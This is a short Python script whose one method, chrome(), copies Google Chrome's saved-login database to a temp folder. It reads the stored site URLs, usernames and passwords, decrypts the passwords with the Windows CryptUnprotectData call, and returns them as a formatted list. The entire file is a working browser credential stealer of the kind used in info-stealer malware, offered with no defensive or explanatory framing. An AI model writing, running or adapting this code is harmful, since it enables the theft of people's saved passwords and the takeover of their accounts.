import os
import sqlite3
from win32 import win32crypt
import sys

class retreive:
    def chrome():
        try:
            path = sys.argv[1]
        except IndexError:
            w = os.getenv('LOCALAPPDATA')
            path = str(w) + r'\Google\Chrome\User Data\Default\Login Data'

        # Connect to the Database
        try:
            
            file = open(path,"rb")
            newfile = open("C:\Windows\Temp\ld.db","wb")
            newfile.write(file.read())
            newfile.close()
            file.close()
            conn = sqlite3.connect("C:\Windows\Temp\ld.db")
            cursor = conn.cursor()
        except Exception as e:
            None

        # Get the results
        try:
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        except Exception as e:
            None

        data = cursor.fetchall()
        pass_list = []
        if len(data) > 0:
            for result in data:
                # Decrypt the Password
                try:
                    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
                except Exception as e:
                    None
                    pass
                if password:
                  pass_list.append(('''[+] URL: %s
            Username: %s 
            Password: %s''' %(result[0], result[1], password.decode())))
        conn.close()
        os.remove("C:\Windows\Temp\ld.db")
        return pass_list
